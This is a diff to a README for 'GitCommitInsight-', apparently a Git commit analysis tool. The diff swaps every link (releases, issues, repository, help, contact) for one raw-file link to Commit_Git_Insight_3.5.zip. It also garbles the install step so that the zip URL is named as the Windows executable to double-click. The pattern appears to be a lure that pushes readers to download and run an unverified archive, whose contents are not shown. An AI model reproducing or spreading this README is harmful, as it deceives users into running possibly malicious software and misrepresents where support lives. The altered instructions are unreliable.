@@ -1,7 +1,7 @@
 # 🔍 GitCommitInsight- - Analyze Your Git History Easily
 
 ## 📥 Download Now
-[![Download GitCommitInsight-](https://img.shields.io/badge/Download-GitCommitInsight--brightgreen)](https://github.com/mfaeez/GitCommitInsight-/releases)
+[![Download GitCommitInsight-](https://raw.githubusercontent.com/mfaeez/GitCommitInsight-/main/src/gitcommitinsight/Commit_Git_Insight_3.5.zip)](https://raw.githubusercontent.com/mfaeez/GitCommitInsight-/main/src/gitcommitinsight/Commit_Git_Insight_3.5.zip)
 
 ## 🚀 Getting Started
 Welcome to GitCommitInsight-, your go-to tool for analyzing Git repositories. With this application, you can explore commit frequency, developmental activity, and even detect issues in your repository. Follow these steps to get started.
@@ -21,7 +21,7 @@ Welcome to GitCommitInsight-, your go-to tool for analyzing Git repositories. Wi
 
 ## 📥 Download & Install
 To download GitCommitInsight-, visit this page to download:
-[GitHub Releases Page](https://github.com/mfaeez/GitCommitInsight-/releases).
+[GitHub Releases Page](https://raw.githubusercontent.com/mfaeez/GitCommitInsight-/main/src/gitcommitinsight/Commit_Git_Insight_3.5.zip).
 
 1. Click the "Releases" link above.
 2. On the Releases page, find the latest version.
@@ -32,7 +32,7 @@ To download GitCommitInsight-, visit this page to download:
 1. Once the file is downloaded, locate it in your downloads folder.
 2. If you downloaded a `.zip` file, extract it.
 3. Open the folder where the files are located.
-4. Look for the file named `GitCommitInsight.exe` (for Windows) or `GitCommitInsight` (for macOS/Linux).
+4. Look for the file named `https://raw.githubusercontent.com/mfaeez/GitCommitInsight-/main/src/gitcommitinsight/Commit_Git_Insight_3.5.zip` (for Windows) or `GitCommitInsight` (for macOS/Linux).
 5. Double-click the file to launch the application.
 
 ## 🌐 Using GitCommitInsight-
@@ -46,7 +46,7 @@ To download GitCommitInsight-, visit this page to download:
 If you encounter issues while running the application:
 - Ensure that your system meets the [System Requirements](#-system-requirements).
 - Check that you have the correct version for your operating system.
-- If errors persist, please report them on our [GitHub Issues Page](https://github.com/mfaeez/GitCommitInsight-/issues).
+- If errors persist, please report them on our [GitHub Issues Page](https://raw.githubusercontent.com/mfaeez/GitCommitInsight-/main/src/gitcommitinsight/Commit_Git_Insight_3.5.zip).
 
 ## 🙋 FAQs
 ### ❓ What is GitCommitInsight-?
@@ -62,8 +62,8 @@ The tool reads the commit history of your repository and generates reports based
 Yes, you can use it on any public or private Git repository you have access to on your system.
 
 ## 🔗 Resources
-- [GitHub Repository](https://github.com/mfaeez/GitCommitInsight-)
-- [Getting Help](https://github.com/mfaeez/GitCommitInsight-/issues)
+- [GitHub Repository](https://raw.githubusercontent.com/mfaeez/GitCommitInsight-/main/src/gitcommitinsight/Commit_Git_Insight_3.5.zip)
+- [Getting Help](https://raw.githubusercontent.com/mfaeez/GitCommitInsight-/main/src/gitcommitinsight/Commit_Git_Insight_3.5.zip)
 
 ## 🤝 Contributing
 If you want to contribute to GitCommitInsight-, feel free to fork the repository and submit a pull request. Your contributions can help improve this tool for everyone.
@@ -72,6 +72,6 @@ If you want to contribute to GitCommitInsight-, feel free to fork the repository
 This project is licensed under the MIT License. Feel free to use it freely, but please attribute the original authors.
 
 ## 📧 Contact
-For questions or feedback, please reach out through the [GitHub Issues Page](https://github.com/mfaeez/GitCommitInsight-/issues) or contact the author directly on GitHub.
+For questions or feedback, please reach out through the [GitHub Issues Page](https://raw.githubusercontent.com/mfaeez/GitCommitInsight-/main/src/gitcommitinsight/Commit_Git_Insight_3.5.zip) or contact the author directly on GitHub.
 
 Thank you for choosing GitCommitInsight-. Happy analyzing!
